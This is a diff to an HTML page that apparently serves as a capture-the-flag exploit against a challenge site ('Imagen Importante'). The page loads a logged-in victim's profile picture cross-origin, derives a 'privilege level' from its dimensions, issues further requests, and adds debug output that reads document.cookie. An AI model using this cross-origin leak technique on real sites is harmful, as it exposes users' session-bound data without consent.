@@ -8,12 +8,21 @@
 </head>
 <body>
     <h1>Fetching Pepe's Profile Picture</h1>
+    <p>Please ensure you are logged into <a href="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/" target="_blank">Imagen Importante</a> before proceeding.</p>
     <img id="profilePic" style="display:none;" />
     <p id="result">Loading...</p>
+    <p id="debug">Debug: Checking session...</p>
 
     <script>
         const targetUrl = "https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic";
 
+        // Check if cookies are being sent (for debugging)
+        function checkCookies() {
+            const cookies = document.cookie;
+            return cookies ? `Cookies detected: ${cookies}` : "No cookies detected.";
+        }
+
+        // Initial image fetch
         const img = new Image();
         img.crossOrigin = "Anonymous"; // Required for cross-origin image loading
         img.src = targetUrl;
@@ -24,6 +33,9 @@
             const privilegeLevel = width * height;
             const hash = md5(privilegeLevel.toString()); // Compute MD5 hash
             let resultText = `Image Dimensions: ${width} x ${height}\nPrivilege Level: ${privilegeLevel}\nMD5 Hash: ${hash}`;
+
+            // Update debug info
+            document.getElementById("debug").innerText = `Debug: ${checkCookies()}`;
 
             // Send additional GET request to /profile-pic
             fetch(targetUrl, {
@@ -57,7 +69,8 @@
         };
 
         img.onerror = function() {
-            document.getElementById("result").innerText = "Error loading image. Ensure Pepe is logged in to the main site.";
+            document.getElementById("result").innerText = "Error loading image. Ensure you are logged into Imagen Importante.";
+            document.getElementById("debug").innerText = `Debug: ${checkCookies()}\nImage fetch failed, likely due to invalid session.`;
         };
 
         document.getElementById("profilePic").src = img.src;
